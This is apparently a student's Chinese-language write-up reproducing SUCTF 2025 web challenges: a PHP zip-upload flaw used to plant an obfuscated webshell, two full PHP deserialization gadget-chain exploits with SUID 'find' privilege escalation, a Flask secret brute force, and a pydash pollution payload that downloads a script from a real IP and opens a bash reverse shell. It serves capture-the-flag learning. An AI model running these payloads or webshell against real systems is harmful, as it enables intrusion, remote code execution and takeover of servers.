# SUCTF 2025


# SUCTF 2025 （复现）

## web

### SU_photogallery

#### 0x00 信息收集

访问 /robots.txt ，提示 see see node.md

![image-20250124102801504](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/24/6792fab235ad0.png)

访问不存在的文件，出现下面这个界面

![image-20250124102531678](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/24/6792fa1ca4ee9.png)

看过 wp 之后，了解到这是在提示 php -S 启动的服务

#### 0x01 获取源码

参考：https://projectdiscovery.io/blog/php-http-server-source-disclosure

![image-20250124104646818](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/24/6792ff17c314d.png)

```php
&lt;?php
/*
 * @Author: Nbc
 * @Date: 2025-01-13 16:13:46
 * @LastEditors: Nbc
 * @LastEditTime: 2025-01-13 16:31:53
 * @FilePath: \src\unzip.php
 * @Description: 
 * 
 * Copyright (c) 2025 by Nbc, All Rights Reserved. 
 */
error_reporting(0);

function get_extension($filename){
    return pathinfo($filename, PATHINFO_EXTENSION);
}
function check_extension($filename,$path){
    $filePath = $path . DIRECTORY_SEPARATOR . $filename;
    
    if (is_file($filePath)) {
        $extension = strtolower(get_extension($filename));

        if (!in_array($extension, [&#39;jpg&#39;, &#39;jpeg&#39;, &#39;png&#39;, &#39;gif&#39;])) {
            if (!unlink($filePath)) {
                // echo &#34;Fail to delete file: $filename\n&#34;;
                return false;
                }
            else{
                // echo &#34;This file format is not supported:$extension\n&#34;;
                return false;
                }
    
        }
        else{
            return true;
            }
}
else{
    // echo &#34;nofile&#34;;
    return false;
}
}
function file_rename ($path,$file){
    $randomName = md5(uniqid().rand(0, 99999)) . &#39;.&#39; . get_extension($file);
                $oldPath = $path . DIRECTORY_SEPARATOR . $file;
                $newPath = $path . DIRECTORY_SEPARATOR . $randomName;

                if (!rename($oldPath, $newPath)) {
                    unlink($path . DIRECTORY_SEPARATOR . $file);
                    // echo &#34;Fail to rename file: $file\n&#34;;
                    return false;
                }
                else{
                    return true;
                }
}

function move_file($path,$basePath){
    foreach (glob($path . DIRECTORY_SEPARATOR . &#39;*&#39;) as $file) {
        $destination = $basePath . DIRECTORY_SEPARATOR . basename($file);
        if (!rename($file, $destination)){
            // echo &#34;Fail to rename file: $file\n&#34;;
            return false;
        }
      
    }
    return true;
}


function check_base($fileContent){
    $keywords = [&#39;eval&#39;, &#39;base64&#39;, &#39;shell_exec&#39;, &#39;system&#39;, &#39;passthru&#39;, &#39;assert&#39;, &#39;flag&#39;, &#39;exec&#39;, &#39;phar&#39;, &#39;xml&#39;, &#39;DOCTYPE&#39;, &#39;iconv&#39;, &#39;zip&#39;, &#39;file&#39;, &#39;chr&#39;, &#39;hex2bin&#39;, &#39;dir&#39;, &#39;function&#39;, &#39;pcntl_exec&#39;, &#39;array&#39;, &#39;include&#39;, &#39;require&#39;, &#39;call_user_func&#39;, &#39;getallheaders&#39;, &#39;get_defined_vars&#39;,&#39;info&#39;];
    $base64_keywords = [];
    foreach ($keywords as $keyword) {
        $base64_keywords[] = base64_encode($keyword);
    }
    foreach ($base64_keywords as $base64_keyword) {
        if (strpos($fileContent, $base64_keyword)!== false) {
            return true;

        }
        else{
           return false;

        }
    }
}

function check_content($zip){
    for ($i = 0; $i &lt; $zip-&gt;numFiles; $i&#43;&#43;) {
        $fileInfo = $zip-&gt;statIndex($i);
        $fileName = $fileInfo[&#39;name&#39;];
        if (preg_match(&#39;/\.\.(\/|\.|%2e%2e%2f)/i&#39;, $fileName)) {
            return false; 
        }
            // echo &#34;Checking file: $fileName\n&#34;;
            $fileContent = $zip-&gt;getFromName($fileName);
            

            if (preg_match(&#39;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#39;, $fileContent) || check_base($fileContent)) {
                // echo &#34;Don&#39;t hack me!\n&#34;;    
                return false;
            }
            else {
                continue;
            }
        }
    return true;
}

function unzip($zipname, $basePath) {
    $zip = new ZipArchive;

    if (!file_exists($zipname)) {
        // echo &#34;Zip file does not exist&#34;;
        return &#34;zip_not_found&#34;;
    }
    if (!$zip-&gt;open($zipname)) {
        // echo &#34;Fail to open zip file&#34;;
        return &#34;zip_open_failed&#34;;
    }
    if (!check_content($zip)) {
        return &#34;malicious_content_detected&#34;;
    }
    $randomDir = &#39;tmp_&#39;.md5(uniqid().rand(0, 99999));
    $path = $basePath . DIRECTORY_SEPARATOR . $randomDir;
    if (!mkdir($path, 0777, true)) {
        // echo &#34;Fail to create directory&#34;;
        $zip-&gt;close();
        return &#34;mkdir_failed&#34;;
    }
    if (!$zip-&gt;extractTo($path)) {
        // echo &#34;Fail to extract zip file&#34;;
        $zip-&gt;close();
    }
    else{
        for ($i = 0; $i &lt; $zip-&gt;numFiles; $i&#43;&#43;) {
            $fileInfo = $zip-&gt;statIndex($i);
            $fileName = $fileInfo[&#39;name&#39;];
            if (!check_extension($fileName, $path)) {
                // echo &#34;Unsupported file extension&#34;;
                continue;
            }
            if (!file_rename($path, $fileName)) {
                // echo &#34;File rename failed&#34;;
                continue;
            }
        }
    }

    if (!move_file($path, $basePath)) {
        $zip-&gt;close();
        // echo &#34;Fail to move file&#34;;
        return &#34;move_failed&#34;;
    }
    rmdir($path);
    $zip-&gt;close();
    return true;
}


$uploadDir = __DIR__ . DIRECTORY_SEPARATOR . &#39;upload/suimages/&#39;;
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

if (isset($_FILES[&#39;file&#39;]) &amp;&amp; $_FILES[&#39;file&#39;][&#39;error&#39;] === UPLOAD_ERR_OK) {
    $uploadedFile = $_FILES[&#39;file&#39;];
    $zipname = $uploadedFile[&#39;tmp_name&#39;];
    $path = $uploadDir;

    $result = unzip($zipname, $path);
    if ($result === true) {
        header(&#34;Location: index.html?status=success&#34;);
        exit();
    } else {
        header(&#34;Location: index.html?status=$result&#34;);
        exit();
    }
} else {
    header(&#34;Location: index.html?status=file_error&#34;);
    exit();
}
```

做一下审计， `unzip()` 中解压失败时执行 `$zip-&gt;close();` 但并没有返回

所以可以构造压缩包，第一个文件放 shell ，后面放损坏的内容，使后一部分解压失败，关闭 zip 流，跳过文件拓展名检查和重命名，以保留 .php 文件

![image-20250125153507616](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794942c5ac08.png)

用 010editor 将下面的文件名改成 /////// 使解压失败

#### 0x02 绕过

先尝试 phpinfo

```php
&lt;?php
$p = &#34;ofniphp&#34;;
$pp = strrev($p);
$pp();
?&gt;
```

`GET /upload/suimages/hack.php` 成功读到 phpinfo

马

```php
&lt;?php
$p = &#34;metsys&#34;;
$pp = strrev($p);
$pp($_POST[&#39;cmd&#39;]);
?&gt;
```

![image-20250125160123692](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/67949a54a8b96.png)



### SU_POP

#### 0x00 参考资料

Symfony 反序列化链分析

参考文章：https://forum.butian.net/share/2411

在 `vendor/symfony/finder/Iterator/SortableIterator.php` 中定义了 `SortableIterator` 类，实现了 `IteratorAggregate` 接口

![image-20250125162940319](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794a0f577b69.png)

`__construct` 接受一个迭代器 `$iterator` ，整型或回调函数 `$sort` ，以及布尔类型 `$reverseOrder`

 如果传入一个 callable 的 `$sort` ，它将会被赋值给 `$this-&gt;sort` 

![image-20250125163327644](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794a1d864118.png)

那么在调用 `getIterator()` 时，对于上述的 `$sort` ，由于不等于 1 或 -1 ，将会调用 `uasort()`

&gt; uasort([array](https://www.php.net/manual/en/language.types.array.php) `&amp;$array`, [callable](https://www.php.net/manual/en/language.types.callable.php) `$callback`): true

`uasort()` 有两个参数，第一个参数是 array ，第二个参数是一个函数，而这两个参数在构造时可指定，即参数可控，那么可以传入 `call_user_func` 方法，实现任意命令执行

那么下面构造链子的思路是寻找类中 `__toString()` ，`__destruct()` ，`__wakeup()` 中直接或间接使用 `foreach` 遍历成员变量的部分

#### 0x01 代码审计

拿到源码，先找一下利用点，看路由

```php
&lt;?php
use Cake\Routing\Route\DashedRoute;
use Cake\Routing\RouteBuilder;

return function (RouteBuilder $routes): void {
    $routes-&gt;setRouteClass(DashedRoute::class);
    $routes-&gt;scope(&#39;/&#39;, function (RouteBuilder $builder): void {
        $builder-&gt;connect(&#39;/&#39;, [&#39;controller&#39; =&gt; &#39;Pages&#39;, &#39;action&#39; =&gt; &#39;display&#39;, &#39;home&#39;]);
        $builder-&gt;connect(&#39;/pages/*&#39;, &#39;Pages::display&#39;);
        $builder-&gt;get(&#39;/ser&#39;, [&#39;controller&#39; =&gt; &#39;Pages&#39;, &#39;action&#39; =&gt; &#39;handleSer&#39;]);
        $builder-&gt;fallbacks();
    });
};
```

看起来利用点应该在 `/ser` ，查看一下 `handleSer`

```php
public function handleSer()
{
    $ser = $this-&gt;request-&gt;getQuery(&#39;ser&#39;);
    unserialize(base64_decode($ser));     
    $this-&gt;set(&#39;ser&#39;, $ser);
    $this-&gt;viewBuilder()-&gt;setLayout(&#39;ajax&#39;);
    $this-&gt;render(&#39;handle_ser&#39;);
}
```

确定了利用点，并且参数是 `ser` ，下面找反序列化的入口

搜索 `__destruct` ，最终找到 `/vender/react/promise/src/Internal/RejectedPromise.php` 的 `__destruct` 触发了 `__toString`

![image-20250125172633400](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794ae4a40c04.png)

由于 `$handler = set_rejection_handler(null);` 永远返回 `null` ，且 `$this-&gt;handled` 和 ` $this-&gt;reason` 参数可控，所以这个 `__toString` 总会触发，下面找 `__toString`

![image-20250125173451647](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794b03c3f59a.png)

有两个可能可以利用的

第一个是 `/vendor/composer/composer/src/Composer/DependencyResolver/Pool.php` ，找到了 `foreach`

![image-20250125174445521](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794b28e449ce.png)

第二个是 `/vendor/cakephp/cakephp/src/Http/Response.php` ， `stream` 可控

![image-20250125173939476](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794b15c293f8.png)

#### 0x02 POP1

由于 `packages` 可控，所以链子是

```pop
RejectedPromise::__destruct()-&gt;Pool::__toString()-&gt;SortableIterator::getIterator()
```

吗？

不是，因为附件版本的 `SortableIterator` 中指定了： `private \Closure|int $sort;` 所以如果将字符串 `&#34;call_user_func&#34;` 赋值给 `$sort` 的话，将不能成功序列化/反序列化，所以另寻他类，找一个有 `getIterator()` 方法的类

搜索到的第一个就是，最轻松的一回， `/vendor/cakephp/cakephp/src/Collection/Iterator` 

![image-20250125235829913](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/67950a268eb75.png)

`$this-&gt;_executed` 可控，看一下 `_execute()` 方法

```php
protected function _execute(): void
{
    $mapper = $this-&gt;_mapper;
    foreach ($this-&gt;_data as $key =&gt; $val) {
        $mapper($val, $key, $this);
    }

    if ($this-&gt;_intermediate &amp;&amp; $this-&gt;_reducer === null) {
        throw new LogicException(&#39;No reducer function was provided&#39;);
    }

    $reducer = $this-&gt;_reducer;
    if ($reducer !== null) {
        foreach ($this-&gt;_intermediate as $key =&gt; $list) {
            $reducer($list, $key, $this);
        }
    }
    $this-&gt;_intermediate = [];
    $this-&gt;_executed = true;
}
```

这样的话 `$mapper` 和 `$reducer` 都可以用来执行命令，我这里使用 `$mapper`

所以要利用的链子是

```pop
RejectedPromise::__destruct()-&gt;Pool::__toString()-&gt;MapReduce::_execute()
```



 

poc 如下

```php
&lt;?php

namespace React\Promise\Internal;
use Composer\DependencyResolver\Pool;
class RejectedPromise {
    private $reason;
    private $handled = false;
    public function __construct() {
        $this-&gt;reason = new Pool();
    }
}

namespace Composer\DependencyResolver;
use Cake\Collection\Iterator\MapReduce;
class Pool {
    protected $packages = [];
    public function __construct() {
        $this-&gt;packages = new MapReduce();
    }
}

namespace Cake\Collection\Iterator;
class MapReduce {
    protected bool $_executed = false;
    protected iterable $_data;
    protected $_mapper;
    public function __construct() {
        $this-&gt;_mapper = &#34;call_user_func&#34;;
        // $cmd = &#34;ls /&#34;;
        // $cmd = &#34;cat /flag.txt&#34;;
        // $cmd = &#34;find / -perm -u=s -type f 2&gt;/dev/null&#34;;
        // $cmd = &#34;find / -name flag.txt -exec whoami \;&#34;;
        $cmd = &#34;find / -name flag.txt -exec cat /flag.txt \;&#34;;
        $this-&gt;_data = [$cmd=&gt;&#34;system&#34;];
    }
}

namespace React\Promise\Internal;
echo base64_encode(serialize(new RejectedPromise()));

?&gt;
```

`GET /ser?ser=xxxx` ， `ls`  `find` 之类的命令可以执行且有回显，但是 `cat /flag.txt` 无回显，之前学长提到过 suid 提权（从 www-data 提到 root），试一下能不能行

`find / -perm -u=s -type f 2&gt;/dev/null` ，可以看到 `find` 有 suid 权限

```bash
/usr/bin/chsh
/usr/bin/find
/usr/bin/chfn
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
```

执行 `find / -name flag.txt -exec whoami \;` ，返回 root ，提权成功

执行 `find / -name flag.txt -exec cat /flag.txt \;` ，拿到 flag

![image-20250126001404890](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67950dcd85cce.png)

#### 0x03 POP2

这是另一条链子，跟 0x00 背景知识没什么关系

`stream` 可控的情况下，可以调用任意类的 `__call` 方法

`/vendor/cakephp/cakephp/src/ORM/Table.php` ，`$method` 、 `$this-&gt;_behaviors` 可控，所以 `hasMethod($method)` 可控制永远为 true ，但是 `$args` 不可控

![image-20250125214317076](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794ea75d8335.png)

所以需要找一个能够 rce 的地方，且需要执行方法与函数形参无关（与成员变量有关）

`/vendor/phpunit/phpunit/src/Framework/MockObject/Generator/MockTrait.php` （或者  `MockClass.php` ），找到

![image-20250125215333731](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794ecde54da9.png)

其中 `classCode` 和 `mockName` 均可控

链子找到了：

```pop
RejectedPromise::__destruct()-&gt;Response::__toString()-&gt;Table::__call()-&gt;MockTrait::generate()
```

poc 如下

```php
&lt;?php

namespace React\Promise\Internal;
use Cake\Http\Response;
class RejectedPromise {
    private $reason;
    private $handled = false;
    public function __construct() {
        $this-&gt;reason = new Response();
    }
}

namespace Cake\Http;
use Cake\ORM\Table;
class Response {
    private $stream;
    public function __construct() {
        $this-&gt;stream = new Table();
    }
}

namespace Cake\ORM;
use PHPUnit\Framework\MockObject\Generator\MockTrait;
class Table {
    protected BehaviorRegistry $_behaviors;
    public function __construct() {
        $this-&gt;_behaviors = new BehaviorRegistry();
    }
}
class ObjectRegistry {}
class BehaviorRegistry extends ObjectRegistry {
    protected array $_methodMap;
    protected array $_loaded;
    public function __construct() {
        $this-&gt;_methodMap = [&#34;rewind&#34;=&gt;array(&#34;mz&#34;,&#34;generate&#34;)];
        $this-&gt;_loaded = [&#34;mz&#34;=&gt;new MockTrait()];
    }
}

namespace PHPUnit\Framework\MockObject\Generator;
class MockTrait {
    private string $classCode;
    private string $mockName;
    public function __construct() {
        $this-&gt;mockName = &#34;mz&#34;;
        // $this-&gt;classCode = &#34;phpinfo();&#34;;
        // $cmd = &#34;ls /&#34;;
        $cmd = &#34;find / -name flag.txt -exec cat /flag.txt \;&#34;;
        $this-&gt;classCode = &#39;system(&#34;&#39;.$cmd.&#39;&#34;);&#39;;
    }
}

namespace React\Promise\Internal;
echo base64_encode(serialize(new RejectedPromise()));

?&gt;
```

同样的， suid 提权，读 flag

![image-20250125230928194](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794fea8c91e0.png)

&gt; SUCTF{PoP_CHaiN5_@Re_SO_fUn!!!}

### SU_blog

#### 0x00 信息收集

注册一个 admin 用户（竟然让注册）

登陆后提示 md5 &#43; 时间戳 生成了 SECRET

![image-20250126002940921](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67951175a0760.png)

结合 Cookie 中的 jwt ，推测是 jwt 的 secretkey

#### 0x01 session 伪造

虽然允许注册 admin 用户，但是还是伪造一下 session 吧，wp 看到是非预期

之前用的是 flask-session-cookie-manager ，不能爆破， 官方 wp 给出 flask-unsign ，工具&#43;&#43;

生成字典

```python
import time
import hashlib

wordlist = []
timestamp = int(time.time())
for i in range(timestamp - 1000000, timestamp &#43; 1000000):
    wordlist.append(hashlib.md5(str(i).encode()).hexdigest())

with open(&#34;/home/mingzu/CTF/wordlist.txt&#34;, &#34;w&#34;) as f:
    for word in wordlist:
        f.write(word &#43; &#34;\n&#34;)
```

```bash
&gt; flask-unsign -u -c &#34;eyJ1c2VybmFtZSI6Im1pbmd6dSJ9.Z5UV3g.v4iJ--zejF0WE-AetwuuqaYPy-A&#34; --wordlist wordlist.txt --no-literal-eval
[*] Session decodes to: {&#39;username&#39;: &#39;mingzu&#39;}
[*] Starting brute-forcer with 8 threads..
[&#43;] Found secret key after 996480 attempts2acb53068c17
b&#39;c78e2cbce1051488f1f616939660a68d&#39;
```

爆破出 secret ，伪造 session

```bash
&gt; flask-unsign -s -c &#34;{&#39;username&#39;: &#39;admin&#39;}&#34; --secret &#39;c78e2cbce1051488f1f616939660a68d&#39;
eyJ1c2VybmFtZSI6ImFkbWluIn0.Z5UfEw.PWO_FglQqS-u7lTOfsl_BCMEzeE
```

#### 0x02 获取源码

点开 article ，`GET /article?file=` 的形式感觉是文件包含，读 `articles/../articles/article1.txt`  提示文件未找到，尝试双写绕过，路径正确

![image-20250126003414160](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67951286e540b.png)

读 `/etc/passwd` 确定相对路径

![image-20250126003721334](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/6795134240df1.png)

读 `/flag` 返回读取文件时发生错误，不让直接读

`GET /article?file=articles/..././app.py` 拿到 app.py

```python
from flask import *
import time,os,json,hashlib
from pydash import set_
from waf import pwaf,cwaf

app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest()

users = {&#34;testuser&#34;: &#34;password&#34;}
BASE_DIR = &#39;/var/www/html/myblog/app&#39;

articles = {
    1: &#34;articles/article1.txt&#34;,
    2: &#34;articles/article2.txt&#34;,
    3: &#34;articles/article3.txt&#34;
}

friend_links = [
    {&#34;name&#34;: &#34;bkf1sh&#34;, &#34;url&#34;: &#34;https://ctf.org.cn/&#34;},
    {&#34;name&#34;: &#34;fushuling&#34;, &#34;url&#34;: &#34;https://fushuling.com/&#34;},
    {&#34;name&#34;: &#34;yulate&#34;, &#34;url&#34;: &#34;https://www.yulate.com/&#34;},
    {&#34;name&#34;: &#34;zimablue&#34;, &#34;url&#34;: &#34;https://www.zimablue.life/&#34;},
    {&#34;name&#34;: &#34;baozongwi&#34;, &#34;url&#34;: &#34;https://baozongwi.xyz/&#34;},
]

class User():
    def __init__(self):
        pass

user_data = User()
@app.route(&#39;/&#39;)
def index():
    if &#39;username&#39; in session:
        return render_template(&#39;blog.html&#39;, articles=articles, friend_links=friend_links)
    return redirect(url_for(&#39;login&#39;))

@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
    if request.method == &#39;POST&#39;:
        username = request.form[&#39;username&#39;]
        password = request.form[&#39;password&#39;]
        if username in users and users[username] == password:
            session[&#39;username&#39;] = username
            return redirect(url_for(&#39;index&#39;))
        else:
            return &#34;Invalid credentials&#34;, 403
    return render_template(&#39;login.html&#39;)

@app.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def register():
    if request.method == &#39;POST&#39;:
        username = request.form[&#39;username&#39;]
        password = request.form[&#39;password&#39;]
        users[username] = password
        return redirect(url_for(&#39;login&#39;))
    return render_template(&#39;register.html&#39;)


@app.route(&#39;/change_password&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def change_password():
    if &#39;username&#39; not in session:
        return redirect(url_for(&#39;login&#39;))

    if request.method == &#39;POST&#39;:
        old_password = request.form[&#39;old_password&#39;]
        new_password = request.form[&#39;new_password&#39;]
        confirm_password = request.form[&#39;confirm_password&#39;]

        if users[session[&#39;username&#39;]] != old_password:
            flash(&#34;Old password is incorrect&#34;, &#34;error&#34;)
        elif new_password != confirm_password:
            flash(&#34;New passwords do not match&#34;, &#34;error&#34;)
        else:
            users[session[&#39;username&#39;]] = new_password
            flash(&#34;Password changed successfully&#34;, &#34;success&#34;)
            return redirect(url_for(&#39;index&#39;))

    return render_template(&#39;change_password.html&#39;)


@app.route(&#39;/friendlinks&#39;)
def friendlinks():
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))
    return render_template(&#39;friendlinks.html&#39;, links=friend_links)


@app.route(&#39;/add_friendlink&#39;, methods=[&#39;POST&#39;])
def add_friendlink():
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))

    name = request.form.get(&#39;name&#39;)
    url = request.form.get(&#39;url&#39;)

    if name and url:
        friend_links.append({&#34;name&#34;: name, &#34;url&#34;: url})

    return redirect(url_for(&#39;friendlinks&#39;))


@app.route(&#39;/delete_friendlink/&lt;int:index&gt;&#39;)
def delete_friendlink(index):
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))

    if 0 &lt;= index &lt; len(friend_links):
        del friend_links[index]

    return redirect(url_for(&#39;friendlinks&#39;))

@app.route(&#39;/article&#39;)
def article():
    if &#39;username&#39; not in session:
        return redirect(url_for(&#39;login&#39;))

    file_name = request.args.get(&#39;file&#39;, &#39;&#39;)
    if not file_name:
        return render_template(&#39;article.html&#39;, file_name=&#39;&#39;, content=&#34;未提供文件名。&#34;)

    blacklist = [&#34;waf.py&#34;]
    if any(blacklisted_file in file_name for blacklisted_file in blacklist):
        return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;大黑阔不许看&#34;)
    
    if not file_name.startswith(&#39;articles/&#39;):
        return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;无效的文件路径。&#34;)
    
    if file_name not in articles.values():
        if session.get(&#39;username&#39;) != &#39;admin&#39;:
            return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;无权访问该文件。&#34;)
    
    file_path = os.path.join(BASE_DIR, file_name)
    file_path = file_path.replace(&#39;../&#39;, &#39;&#39;)
    
    try:
        with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
            content = f.read()
    except FileNotFoundError:
        content = &#34;文件未找到。&#34;
    except Exception as e:
        app.logger.error(f&#34;Error reading file {file_path}: {e}&#34;)
        content = &#34;读取文件时发生错误。&#34;

    return render_template(&#39;article.html&#39;, file_name=file_name, content=content)


@app.route(&#39;/Admin&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def admin():
    if request.args.get(&#39;pass&#39;)!=&#34;SUers&#34;:
        return &#34;nonono&#34;
    if request.method == &#39;POST&#39;:
        try:
            body = request.json

            if not body:
                flash(&#34;No JSON data received&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;No JSON data received&#34;}), 400

            key = body.get(&#39;key&#39;)
            value = body.get(&#39;value&#39;)

            if key is None or value is None:
                flash(&#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;}), 400

            if not pwaf(key):
                flash(&#34;Invalid key format&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Invalid key format&#34;}), 400

            if not cwaf(value):
                flash(&#34;Invalid value format&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Invalid value format&#34;}), 400

            set_(user_data, key, value)

            flash(&#34;User data updated successfully&#34;, &#34;success&#34;)
            return jsonify({&#34;message&#34;: &#34;User data updated successfully&#34;}), 200

        except json.JSONDecodeError:
            flash(&#34;Invalid JSON data&#34;, &#34;error&#34;)
            return jsonify({&#34;message&#34;: &#34;Invalid JSON data&#34;}), 400
        except Exception as e:
            flash(f&#34;An error occurred: {str(e)}&#34;, &#34;error&#34;)
            return jsonify({&#34;message&#34;: f&#34;An error occurred: {str(e)}&#34;}), 500

    return render_template(&#39;admin.html&#39;, user_data=user_data)


@app.route(&#39;/logout&#39;)
def logout():
    session.pop(&#39;username&#39;, None)
    flash(&#34;You have been logged out.&#34;, &#34;info&#34;)
    return redirect(url_for(&#39;login&#39;))



if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;,port=5000)
```

康康 waf.py ，在黑名单里，但因为 `../` 会被去掉，所以能绕过去

```py
key_blacklist = [
    &#39;__file__&#39;, &#39;app&#39;, &#39;router&#39;, &#39;name_index&#39;,
    &#39;directory_handler&#39;, &#39;directory_view&#39;, &#39;os&#39;, &#39;path&#39;, &#39;pardir&#39;, &#39;_static_folder&#39;,
    &#39;__loader__&#39;, &#39;0&#39;,  &#39;1&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
]

value_blacklist = [
    &#39;ls&#39;, &#39;dir&#39;, &#39;nl&#39;, &#39;nc&#39;, &#39;cat&#39;, &#39;tail&#39;, &#39;more&#39;, &#39;flag&#39;, &#39;cut&#39;, &#39;awk&#39;,
    &#39;strings&#39;, &#39;od&#39;, &#39;ping&#39;, &#39;sort&#39;, &#39;ch&#39;, &#39;zip&#39;, &#39;mod&#39;, &#39;sl&#39;, &#39;find&#39;,
    &#39;sed&#39;, &#39;cp&#39;, &#39;mv&#39;, &#39;ty&#39;, &#39;grep&#39;, &#39;fd&#39;, &#39;df&#39;, &#39;sudo&#39;, &#39;more&#39;, &#39;cc&#39;, &#39;tac&#39;, &#39;less&#39;,
    &#39;head&#39;, &#39;{&#39;, &#39;}&#39;, &#39;tar&#39;, &#39;zip&#39;, &#39;gcc&#39;, &#39;uniq&#39;, &#39;vi&#39;, &#39;vim&#39;, &#39;file&#39;, &#39;xxd&#39;,
    &#39;base64&#39;, &#39;date&#39;, &#39;env&#39;, &#39;?&#39;, &#39;wget&#39;, &#39;&#34;&#39;, &#39;id&#39;, &#39;whoami&#39;, &#39;readflag&#39;
]

# 将黑名单转换为字节串
key_blacklist_bytes = [word.encode() for word in key_blacklist]
value_blacklist_bytes = [word.encode() for word in value_blacklist]

def check_blacklist(data, blacklist):
    for item in blacklist:
        if item in data:
            return False
    return True

def pwaf(key):
    # 将 key 转换为字节串
    key_bytes = key.encode()
    if not check_blacklist(key_bytes, key_blacklist_bytes):
        print(f&#34;Key contains blacklisted words.&#34;)
        return False
    return True

def cwaf(value):
    if len(value) &gt; 77:
        print(&#34;Value exceeds 77 characters.&#34;)
        return False
    
    # 将 value 转换为字节串
    value_bytes = value.encode()
    if not check_blacklist(value_bytes, value_blacklist_bytes):
        print(f&#34;Value contains blacklisted words.&#34;)
        return False
    return True
```

`/Admin` 里面用到了 `pydash.set_(user_data, key, value)` ，查到是原型链污染，但是过滤的有点多

#### 0x03 反弹 shell  

![image-20250126183105768](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67960eeb1e8fe.png)

payload ，参考：https://ctftime.org/writeup/36082

```json
{
	&#34;key&#34;: &#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&#34;,
	&#34;value&#34;: &#34;*;__import__(&#39;os&#39;).system(&#39;curl http://47.76.93.208:8000/hack.sh | bash&#39;);#&#34;
}
```

hack.sh

```sh
bash -c &#34;bash -i &gt;&amp; /dev/tcp/47.76.93.208/2333 0&gt;&amp;1&#34;
```

访问渲染 admin.html 的页面，点了一下 back to home ，触发反弹

![image-20250126183241888](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67960f4a9aefe.png)

![image-20250126183306944](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67960f639a255.png)

&gt; SUCTF{fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3}



### SU_easyk8s

k8s 用都没用过，一点头猪没有，也没搜到太多有用的东西，直接看 wp 吧

#### 0x00 Python Audit Hook RCE

什么玩意，没听说过，查：https://xz.aliyun.com/news/15665

&gt; Audit Hook 是 python 3.8 中引入的特性，使用审计狗子来监控和记录程序运行行为，特别是安全敏感行为，如文件读写、网络通信和动态代码执行等
&gt;
&gt; 审计事件包括但不限于：
&gt;
&gt; `import` : 导入模块
&gt;
&gt; `open` : 打开文件
&gt;
&gt; `exec` : 执行代码
&gt;
&gt; `compile` : 编译代码
&gt;
&gt; `socket` : 创建或使用套接字
&gt;
&gt; `os.system` ， `os.popen` 等 : 执行操作系统命令
&gt;
&gt; `subprocess.popen` ， `subprocess.run` 等 : 启动子进程
&gt;
&gt; 等等

这种 pyjail 要 rce 查了查有好多种方法

```python
DEBUG = True
import os, sys
origin_print = print
def print(*args):
    # original_print(sys._getframe(1).f_locals)
    t = sys._getframe(1).f_locals[&#39;audit_functions&#39;]
    t[&#39;os.system&#39;][&#39;ban&#39;] = False
    # origin_print(t)
    return origin_print(*args)

os.system(&#39;ls&#39;)
```

第一次见，长见识了，先把原生 `print` 保存为 `origin_print` ，然后重写 `print`

访问调用栈上一级函数的局部变量，这里调用的是 `os.system` 的局部变量

1 是上一级帧，0 是当前帧，依此类推

```python
t = sys._getframe(1).f_locals
